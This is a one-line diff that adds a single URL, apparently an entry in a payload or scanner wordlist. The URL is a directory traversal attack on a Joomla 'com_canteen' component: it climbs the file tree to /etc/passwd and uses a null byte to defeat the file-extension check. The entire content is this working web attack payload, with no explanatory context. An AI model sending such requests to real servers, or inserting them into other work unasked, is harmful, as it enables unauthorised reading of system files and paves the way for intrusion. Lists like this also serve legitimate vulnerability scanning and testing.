@@ -1,0 +1,1 @@
+/index.php?option=com_canteen&controller=../../../../../etc/passwd%00
